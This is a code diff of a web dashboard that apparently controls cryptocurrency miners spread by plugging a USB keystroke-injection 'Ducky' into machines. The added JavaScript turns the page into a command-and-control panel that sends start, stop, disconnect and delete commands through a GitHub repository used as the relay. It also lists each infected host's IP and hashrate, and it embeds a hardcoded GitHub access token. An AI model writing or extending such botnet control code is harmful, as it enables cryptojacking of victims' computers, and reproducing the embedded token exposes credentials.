@@ -19,7 +19,13 @@ h1 span{color:#3fb950}
 .info{flex:1}
 .name{font-weight:500}
 .sub{font-size:12px;color:#8b949e}
-.hr{font-size:18px;font-weight:600;color:#3fb950}
+.hr{font-size:18px;font-weight:600;color:#3fb950;min-width:80px;text-align:right}
+.btns{display:flex;gap:8px}
+.btn{padding:6px 12px;border:1px solid #30363d;border-radius:6px;background:#21262d;color:#e6edf3;cursor:pointer;font-size:12px}
+.btn:hover{background:#30363d}
+.btn.stop{border-color:#f85149;color:#f85149}
+.btn.start{border-color:#3fb950;color:#3fb950}
+.btn.del{border-color:#f85149;color:#f85149}
 .empty{text-align:center;padding:40px;color:#8b949e}
 </style>
 </head>
@@ -31,26 +37,69 @@ h1 span{color:#3fb950}
 </div>
 <div class="miners">
 <b>Miners</b>
-<div id="list"><div class="empty">No miners yet - plug in your Ducky!</div></div>
+<div id="list"><div class="empty">No miners yet</div></div>
 </div>
 <script>
+const TOKEN="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";
+const REPO="max1734601-cpu/mining-dashboard";
+let miners={},cmds={},sha_m="",sha_c="";
+
 async function load(){
 try{
-const r=await fetch('https://raw.githubusercontent.com/max1734601-cpu/mining-dashboard/main/miners.json?t='+Date.now());
-if(!r.ok)return;
-const m=await r.json();
-const list=Object.entries(m);
+let r=await fetch(`https://api.github.com/repos/${REPO}/contents/miners.json`,{headers:{Authorization:`token ${TOKEN}`}});
+let d=await r.json();sha_m=d.sha;miners=JSON.parse(atob(d.content));
+}catch(e){miners={}}
+try{
+let r=await fetch(`https://api.github.com/repos/${REPO}/contents/commands.json`,{headers:{Authorization:`token ${TOKEN}`}});
+let d=await r.json();sha_c=d.sha;cmds=JSON.parse(atob(d.content));
+}catch(e){cmds={}}
+render();
+}
+
+async function sendCmd(id,cmd){
+cmds[id]=cmd;
+await fetch(`https://api.github.com/repos/${REPO}/contents/commands.json`,{
+method:"PUT",
+headers:{Authorization:`token ${TOKEN}`,"Content-Type":"application/json"},
+body:JSON.stringify({message:"cmd",content:btoa(JSON.stringify(cmds)),sha:sha_c})
+});
+if(cmd=="delete"){
+delete miners[id];
+await fetch(`https://api.github.com/repos/${REPO}/contents/miners.json`,{
+method:"PUT",
+headers:{Authorization:`token ${TOKEN}`,"Content-Type":"application/json"},
+body:JSON.stringify({message:"del",content:btoa(JSON.stringify(miners)),sha:sha_m})
+});
+}
+load();
+}
+
+function render(){
+const list=Object.entries(miners);
 if(!list.length){document.getElementById('list').innerHTML='<div class="empty">No miners yet</div>';return}
 let active=0,hr=0;
 document.getElementById('list').innerHTML=list.map(([id,d])=>{
 const on=(Date.now()-d.lastSeen)<120000&&d.mining;
-if(on){active++;hr+=d.hashrate||0}
-return'<div class="miner"><div class="dot '+(on?'on':'')+'"></div><div class="info"><div class="name">'+d.name+'</div><div class="sub">'+d.ip+' • '+(on?'Mining':'Offline')+'</div></div><div class="hr">'+(on?(d.hashrate||0)+' H/s':'—')+'</div></div>';
+const stopped=cmds[id]=="stop";
+const disc=cmds[id]=="disconnect";
+if(on&&!stopped&&!disc){active++;hr+=d.hashrate||0}
+let status=disc?"Disconnected":(stopped?"Stopped":(on?"Mining":"Offline"));
+let dotClass=disc?"":stopped?"":(on?"on":"");
+return`<div class="miner">
+<div class="dot ${dotClass}"></div>
+<div class="info"><div class="name">${d.name}</div><div class="sub">${d.ip} • ${status}</div></div>
+<div class="hr">${on&&!stopped&&!disc?(d.hashrate||0)+' H/s':'—'}</div>
+<div class="btns">
+${stopped||disc?`<button class="btn start" onclick="sendCmd('${id}','start')">Start</button>`:`<button class="btn stop" onclick="sendCmd('${id}','stop')">Stop</button>`}
+${disc?`<button class="btn start" onclick="sendCmd('${id}','connect')">Connect</button>`:`<button class="btn" onclick="sendCmd('${id}','disconnect')">Disconnect</button>`}
+<button class="btn del" onclick="sendCmd('${id}','delete')">✕</button>
+</div>
+</div>`;
 }).join('');
 document.getElementById('s-active').textContent=active;
 document.getElementById('s-hr').textContent=hr>=1000?(hr/1000).toFixed(1)+' KH/s':hr+' H/s';
-}catch(e){console.log(e)}
 }
+
 load();setInterval(load,30000);
 </script>
 </body>
